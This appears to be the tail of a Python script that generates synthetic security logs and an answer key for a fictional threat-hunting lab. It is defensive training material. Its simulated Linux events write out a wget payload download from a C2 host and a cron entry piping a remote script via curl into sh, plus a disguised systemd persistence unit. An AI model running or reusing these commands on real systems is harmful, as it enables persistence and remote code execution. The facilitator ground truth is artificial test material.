lproc(ts(3, 1, 34), "LNX-NAS-01", "/usr/bin/wget", f"wget -q http://{C2}/l -O /dev/shm/.nwcache/dbus-cached", "/usr/bin/bash")
lproc(ts(3, 1, 35), "LNX-NAS-01", "/usr/bin/sh",
      f"sh -c \"echo '*/10 * * * * root curl -fsSL http://{C2}/n.sh | sh' > /etc/cron.d/nwcache\"", "/usr/bin/bash",
      tags=[("HL-0013", M, "Cron entry piping a remote script from the C2 server to sh every 10 minutes")])
lproc(ts(3, 1, 36), "LNX-NAS-01", "/usr/bin/sh",
      "sh -c \"printf '[Unit]\\nDescription=D-Bus cache\\n[Service]\\nExecStart=/dev/shm/.nwcache/dbus-cached\\nRestart=always\\n"
      "[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/dbus-cache.service\"", "/usr/bin/bash",
      tags=[("HL-0013", M, "Masquerading systemd unit executing a binary from /dev/shm")])
lproc(ts(3, 1, 37), "LNX-NAS-01", "/usr/bin/systemctl", "systemctl enable --now dbus-cache.service", "/usr/bin/bash")
lproc(ts(3, 2, 20), "LNX-NAS-01", "/dev/shm/.nwcache/dbus-cached", "/dev/shm/.nwcache/dbus-cached --path /volume1 --ext .qledger",
      "/usr/lib/systemd/systemd")  # Linux encryptor - found by pivoting, no hunt matches it

# DNS: normal browsing, AV hash-reputation lookups (long labels), then the implant's DNS beacon
NORMAL_DNS = ["www.bing.com", "outlook.office365.com", "login.microsoftonline.com", "teams.microsoft.com", "github.com",
              "update.googleapis.com", "settings-win.data.microsoft.com", "news.example.com", "lab.example", "srv-file-01.lab.example"]
CHROME = APPS[0][0]
for _ in range(1500):
    host = rnd.choice(list(WORKSTATIONS))
    dnsq(rand_time(), host, CHROME, rnd.choice(NORMAL_DNS))
AV = r"C:\Program Files\NorthShield\nsagent.exe"
for _ in range(60):
    host = rnd.choice(list(WORKSTATIONS))
    dnsq(rand_time(), host, AV, f"{rnd.getrandbits(160):040x}.rep.northshield.example", "TXT",
         tags=[("HL-0014", B, "NorthShield AV file-reputation lookups: signed AV agent, many hosts, irregular timing")])
B32 = "abcdefghijklmnopqrstuvwxyz234567"
beacon_t = START + timedelta(days=2, hours=9, minutes=25)
end_t = START + timedelta(days=3, hours=2, minutes=30)
IMPLANT = r"C:\Users\jmiller\AppData\Roaming\Microsoft\odupd.exe"
while beacon_t < end_t:
    dnsq(beacon_t, V, IMPLANT, "".join(rnd.choice(B32) for _ in range(32)) + ".t.cdn-sync-telemetry.example", "TXT",
         tags=[("HL-0014", M, "Implant DNS beacon: ~300 s interval, unique base32 label per query, TXT")])
    beacon_t += timedelta(seconds=300 + rnd.randint(-15, 15))

# --------------------------------------------------------------------------- write outputs
def iso(t):
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


def finalize(events, prefix):
    events.sort(key=lambda e: e["_t"])
    for i, e in enumerate(events, 1):
        e["LabEventId"] = f"{prefix}-{i:05d}"
        for hunt, kind, note in e["_tags"]:
            truth[hunt][kind].append({"id": e["LabEventId"], "note": note})


for evs, p in ((proc_events, "P"), (reg_events, "R"), (net_events, "N"), (sec_events, "S"),
               (signin_events, "E"), (audit_events, "A"), (linux_events, "L"), (dns_events, "D")):
    finalize(evs, p)


def write_jsonl(path, rows):
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="\n") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")


def write_csv(path, rows, cols):
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=cols, lineterminator="\n")
        w.writeheader()
        for r in rows:
            w.writerow({c: r.get(c) for c in cols})


def short(host_fqdn):
    return host_fqdn.split(".")[0]


def acct(u):
    return u.split("\\")[-1]


def folder(p):
    return p.rsplit("\\", 1)[0] if "\\" in p else ""


write_jsonl(OUT / "sysmon/process_creation.jsonl", [dict(
    UtcTime=iso(e["_t"]), EventID=1, EventCode=1, Channel="Microsoft-Windows-Sysmon/Operational",
    **{k: v for k, v in e.items() if not k.startswith("_")}) for e in proc_events])
write_jsonl(OUT / "sysmon/registry_set.jsonl", [dict(
    UtcTime=iso(e["_t"]), EventID=13, EventCode=13, Channel="Microsoft-Windows-Sysmon/Operational",
    **{k: v for k, v in e.items() if not k.startswith("_")}) for e in reg_events])
write_jsonl(OUT / "sysmon/network_connection.jsonl", [dict(
    UtcTime=iso(e["_t"]), EventID=3, EventCode=3, Channel="Microsoft-Windows-Sysmon/Operational",
    **{k: v for k, v in e.items() if not k.startswith("_")}) for e in net_events])
write_jsonl(OUT / "security/security.jsonl", [dict(
    UtcTime=iso(e["_t"]), EventCode=e["EventID"], Channel="Security",
    **{k: v for k, v in e.items() if not k.startswith("_") and v is not None}) for e in sec_events])

write_csv(OUT / "mde/DeviceProcessEvents.csv", [dict(
    Timestamp=iso(e["_t"]), DeviceName=e["Computer"], ActionType="ProcessCreated", FileName=basename(e["Image"]),
    FolderPath=e["Image"], ProcessCommandLine=e["CommandLine"], ProcessVersionInfoOriginalFileName=e["OriginalFileName"],
    ProcessVersionInfoFileDescription=e["Description"], AccountDomain=e["User"].split("\\")[0], AccountName=acct(e["User"]),
    InitiatingProcessFileName=basename(e["ParentImage"]), InitiatingProcessFolderPath=e["ParentImage"],
    InitiatingProcessCommandLine=e["ParentCommandLine"], ProcessId=e["ProcessId"], ReportId=e["LabEventId"]) for e in proc_events],
    ["Timestamp", "DeviceName", "ActionType", "FileName", "FolderPath", "ProcessCommandLine",
     "ProcessVersionInfoOriginalFileName", "ProcessVersionInfoFileDescription", "AccountDomain", "AccountName",
     "InitiatingProcessFileName", "InitiatingProcessFolderPath", "InitiatingProcessCommandLine", "ProcessId", "ReportId"])


def mde_key(k):
    return k.replace("HKLM\\", "HKEY_LOCAL_MACHINE\\").replace("HKU\\", "HKEY_USERS\\")


write_csv(OUT / "mde/DeviceRegistryEvents.csv", [dict(
    Timestamp=iso(e["_t"]), DeviceName=e["Computer"], ActionType="RegistryValueSet",
    RegistryKey=mde_key(folder(e["TargetObject"])), RegistryValueName=e["TargetObject"].rsplit("\\", 1)[1],
    RegistryValueData=e["Details"], InitiatingProcessFileName=basename(e["Image"]), InitiatingProcessFolderPath=e["Image"],
    InitiatingProcessAccountName=acct(e["User"]), ReportId=e["LabEventId"]) for e in reg_events],
    ["Timestamp", "DeviceName", "ActionType", "RegistryKey", "RegistryValueName", "RegistryValueData",
     "InitiatingProcessFileName", "InitiatingProcessFolderPath", "InitiatingProcessAccountName", "ReportId"])

write_csv(OUT / "mde/DeviceNetworkEvents.csv", [dict(
    Timestamp=iso(e["_t"]), DeviceName=e["Computer"], ActionType="ConnectionSuccess", LocalIP=e["SourceIp"],
    RemoteIP=e["DestinationIp"], RemotePort=e["DestinationPort"], RemoteUrl=e["DestinationHostname"],
    InitiatingProcessFileName=basename(e["Image"]), InitiatingProcessFolderPath=e["Image"],
    InitiatingProcessVersionInfoOriginalFileName=e["OriginalFileName"], InitiatingProcessAccountName=acct(e["User"]),
    ReportId=e["LabEventId"]) for e in net_events],
    ["Timestamp", "DeviceName", "ActionType", "LocalIP", "RemoteIP", "RemotePort", "RemoteUrl", "InitiatingProcessFileName",
     "InitiatingProcessFolderPath", "InitiatingProcessVersionInfoOriginalFileName", "InitiatingProcessAccountName", "ReportId"])

write_csv(OUT / "sentinel/SecurityEvent.csv", [dict(
    TimeGenerated=iso(e["_t"]), Computer=e["Computer"], EventID=e["EventID"],
    Account=f"{e['TargetDomainName']}\\{e['TargetUserName']}", TargetUserName=e["TargetUserName"],
    TargetDomainName=e["TargetDomainName"], ServiceName=e["ServiceName"], TicketEncryptionType=e["TicketEncryptionType"],
    TicketOptions=e["TicketOptions"], Status=e["Status"], IpAddress=e["IpAddress"], LogonType=e["LogonType"],
    WorkstationName=e["WorkstationName"], LabEventId=e["LabEventId"]) for e in sec_events],
    ["TimeGenerated", "Computer", "EventID", "Account", "TargetUserName", "TargetDomainName", "ServiceName",
     "TicketEncryptionType", "TicketOptions", "Status", "IpAddress", "LogonType", "WorkstationName", "LabEventId"])

# v1.1 outputs
def strip(e):
    return {k: v for k, v in e.items() if not k.startswith("_")}


write_jsonl(OUT / "sysmon/dns_query.jsonl", [dict(UtcTime=iso(e["_t"]), EventID=22, EventCode=22,
            Channel="Microsoft-Windows-Sysmon/Operational", **strip(e)) for e in dns_events])
write_jsonl(OUT / "linux/process_creation.jsonl", [dict(UtcTime=iso(e["_t"]), EventID=1, EventCode=1,
            Channel="Linux-Sysmon/Operational", **strip(e)) for e in linux_events])
write_jsonl(OUT / "entra/signinlogs.jsonl", [dict(UtcTime=iso(e["_t"]), **strip(e)) for e in signin_events])
write_jsonl(OUT / "entra/auditlogs.jsonl", [dict(UtcTime=iso(e["_t"]), **strip(e)) for e in audit_events])

write_csv(OUT / "sentinel/SigninLogs.csv", [dict(
    TimeGenerated=iso(e["_t"]), UserPrincipalName=e["UserPrincipalName"], AppDisplayName=e["AppDisplayName"],
    IPAddress=e["IPAddress"], Location=e["Location"], ResultType=str(e["ResultType"]), ResultDescription=e["ResultDescription"],
    AuthenticationRequirement=e["AuthenticationRequirement"], ClientAppUsed=e["ClientAppUsed"],
    ConditionalAccessStatus=e["ConditionalAccessStatus"],
    AuthenticationDetails=json.dumps([{"authenticationMethod": e["AuthenticationMethod"],
                                       "succeeded": e["ResultType"] == 0,
                                       "authenticationStepResultDetail": e["AuthenticationDetail"] or
                                       ("MFA successfully completed" if e["ResultType"] == 0 else e["ResultDescription"])}]),
    LabEventId=e["LabEventId"]) for e in signin_events],
    ["TimeGenerated", "UserPrincipalName", "AppDisplayName", "IPAddress", "Location", "ResultType", "ResultDescription",
     "AuthenticationRequirement", "ClientAppUsed", "ConditionalAccessStatus", "AuthenticationDetails", "LabEventId"])


def target_resources(e):
    if not e["TargetAppName"]:
        return json.dumps([{"displayName": "user", "type": "User", "modifiedProperties": []}])
    props = []
    if e["OperationName"] == "Consent to application":
        props = [{"displayName": "ConsentContext.IsAdminConsent", "oldValue": None, "newValue": f'"{e["IsAdminConsent"]}"'},
                 {"displayName": "ConsentAction.Permissions", "oldValue": None,
                  "newValue": f'"[] => [[Id: lab, ClientId: {e["TargetAppId"]}, ConsentType: '
                              f'{"AllPrincipals" if e["IsAdminConsent"] else "Principal"}, Scope: {e["ConsentPermissions"]}, ]];"'},
                 {"displayName": "TargetId.ServicePrincipalNames", "oldValue": None, "newValue": f'"{e["TargetAppId"]}"'}]
    return json.dumps([{"displayName": e["TargetAppName"], "id": e["TargetAppId"], "type": "ServicePrincipal",
                        "modifiedProperties": props}])


write_csv(OUT / "sentinel/AuditLogs.csv", [dict(
    TimeGenerated=iso(e["_t"]), OperationName=e["OperationName"], Category=e["Category"], Result=e["Result"],
    InitiatedBy=json.dumps({"user": {"userPrincipalName": e["InitiatedBy"], "ipAddress": e["InitiatedByIp"]}}),
    TargetResources=target_resources(e), LabEventId=e["LabEventId"]) for e in audit_events],
    ["TimeGenerated", "OperationName", "Category", "Result", "InitiatedBy", "TargetResources", "LabEventId"])

write_csv(OUT / "sentinel/DnsEvents.csv", [dict(
    TimeGenerated=iso(e["_t"]), Computer=FQDN("SRV-DC-01"), ClientIP=HOSTS[short(e["Computer"])], Name=e["QueryName"],
    QueryType=e["QueryType"], SubType="LookupQuery", ResultCode=0, LabEventId=e["LabEventId"]) for e in dns_events],
    ["TimeGenerated", "Computer", "ClientIP", "Name", "QueryType", "SubType", "ResultCode", "LabEventId"])

write_csv(OUT / "mde/DeviceProcessEvents_Linux.csv", [dict(
    Timestamp=iso(e["_t"]), DeviceName=e["Computer"], ActionType="ProcessCreated", FileName=e["Image"].rsplit("/", 1)[-1],
    FolderPath=e["Image"], ProcessCommandLine=e["CommandLine"], AccountName=e["User"],
    InitiatingProcessFileName=e["ParentImage"].rsplit("/", 1)[-1], InitiatingProcessFolderPath=e["ParentImage"],
    ProcessId=e["ProcessId"], ReportId=e["LabEventId"]) for e in linux_events],
    ["Timestamp", "DeviceName", "ActionType", "FileName", "FolderPath", "ProcessCommandLine", "AccountName",
     "InitiatingProcessFileName", "InitiatingProcessFolderPath", "ProcessId", "ReportId"])

KEY.write_text(json.dumps({
    "_readme": "Ground truth for the lab dataset. Facilitators only - do not share with attendees before the debrief.",
    "scenario": "Operation Quiet Ledger (fictional)",
    "patient_zero": {"host": FQDN(V), "user": "jmiller", "first_malicious": "2026-10-07T09:14Z"},
    "attacker_infrastructure": {"c2": [C2, C2_ALT], "exfil": MEGA + ["*.mega.co.nz"]},
    "hunts": truth,
}, indent=2) + "\n")

print(f"process={len(proc_events)} registry={len(reg_events)} network={len(net_events)} security={len(sec_events)} "
      f"signin={len(signin_events)} audit={len(audit_events)} linux={len(linux_events)} dns={len(dns_events)}")
for h, v in truth.items():
    print(f"{h}: malicious={len(v['malicious'])} benign_match={len(v['benign_match'])}")
